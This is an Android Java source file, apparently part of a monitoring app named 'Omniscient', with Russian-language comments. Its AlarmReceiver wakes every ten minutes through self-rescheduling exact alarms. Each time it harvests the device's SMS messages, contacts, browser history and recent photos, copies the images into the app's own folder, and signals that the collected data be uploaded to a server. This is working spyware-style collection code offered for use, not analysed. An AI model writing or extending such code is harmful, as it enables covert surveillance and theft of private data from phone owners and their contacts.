package com.postal.omniscient.postal.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.postal.omniscient.postal.SPreferences.PreferencesGetSet;
import com.postal.omniscient.postal.adapter.AdapterData;
import com.postal.omniscient.postal.adapter.EventBusData;
import com.postal.omniscient.postal.reader.browser_history.BrowserHistory;
import com.postal.omniscient.postal.reader.contact.ReadContacts;
import com.postal.omniscient.postal.reader.image.AllImages;
import com.postal.omniscient.postal.reader.sms.ReadSms;

import org.greenrobot.eventbus.EventBus;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

/** перезапускаем старт ресивера после выполнения (безконечный цыкл) раз в 10 мин записуем
 *  контакты ,смс и браузера историю*/
public class AlarmReceiver extends BroadcastReceiver {
    final int SDK_INT = Build.VERSION.SDK_INT;
    private static String Msg = "MyMsg";
    public AlarmReceiver() {
    }

    @Override
    //Сбор данных для отправки на сервер каждые 24 часа
    public void onReceive(final Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        try {
final Context context1 = context;
            //запускаем поток для сбора данных
            //устраняем проблему загрузки файлов во время их создания
            Thread dataCollection = new Thread("AlarmReceiver") {
                @Override
                public void run() {
                    PreferencesGetSet Sp = new PreferencesGetSet();
                    Long last_scan = Sp.readeFromPreferences(context1);
                    if (last_scan > 0) {
                        if (System.currentTimeMillis() > last_scan + (1000 * 60 * 10 - 1)) {
                            try {
                                ReadContacts contact = new ReadContacts(context1);
                                BrowserHistory browser = new BrowserHistory(context1, context1.getContentResolver());
                                ReadSms sms = new ReadSms(context1, context1.getContentResolver());
                                sms.smsToJson();
                                contact.getContacts();
                                browser.historyToJson();
                                saveIMAGE(context1, context1.getContentResolver());
                                Sp.writeToPreferences(context1);
                                EventBus.getDefault().post(new EventBusData("all_file"));// если есть коннект пробуем отправить новые данные на сервер
                            } catch (Exception e) {
                                Log.i(Msg, "Error AlarmReceiver run " + e);
                            }
                        }
                    } else {Sp.writeToPreferences(context1);}
                }
            };

            dataCollection.start();
//            dataCollection.join();


            AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
            Intent myIntent = new Intent(context, AlarmReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, myIntent, 0);


            if (SDK_INT < Build.VERSION_CODES.KITKAT) {
                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 *10, pendingIntent);
            } else if (Build.VERSION_CODES.KITKAT <= SDK_INT && SDK_INT < Build.VERSION_CODES.M) {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 *10, pendingIntent);
            } else if (SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 *10, pendingIntent);
            }
        }catch (Exception e){Log.i(Msg, "Error AlarmReceiver onReceive "+e);}
    }
    //IMEGE
    private void saveIMAGE(Context context, ContentResolver contentResolver) {
        try {
            AllImages img = new AllImages(context, contentResolver);

            List<AdapterData> listOfAllImages = img.getLastImages();
            String patchFile;
            for (AdapterData a : listOfAllImages) {
                if (!a.getAddress().equals("")) {
                    patchFile = a.getAddress();
                    // добавляем свой каталог к пути
                    File pathToFile = new File(context.getFilesDir(), "/Omniscient/Image");//DIR);
                    copyFile(patchFile, pathToFile.toString());
                    //переименовуем файл
                    String date = new SimpleDateFormat("yyyy_MM_dd_HH-mm")
                            .format(new Date());
                    File file1 = new File(pathToFile.toString() + "/" + new File(patchFile).getName());
                    File file2 = new File(pathToFile.toString() + "/" + date + "_" + new File(patchFile).getName());
                    file1.renameTo(file2);
                }
            }
        }catch (Exception e){Log.i(Msg, "Error AlarmReceiver saveIMAGE "+e);}
    }
    //копируем нужные файлы в папку программы для отправки на сервер
    private void copyFile(String inputPath, String outputPath) {

        InputStream in = null;
        OutputStream out = null;
        try {

            //create output directory if it doesn't exist
            File dir = new File (outputPath);
            if (!dir.exists()) {
                dir.mkdirs();
            }

            String inputFile = new File (inputPath).getName();
            in = new FileInputStream(inputPath);
            out = new FileOutputStream(outputPath +"/"+ inputFile);

            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            in = null;

            // write the output file (You have now copied the file)
            out.flush();
            out.close();
            out = null;

        }  catch (FileNotFoundException fnfe1) {
            Log.e(Msg, fnfe1.getMessage());
        }
        catch (Exception e) {
            Log.i(Msg, "Error AlarmReceiver copyFile "+e);
        }
    }
}
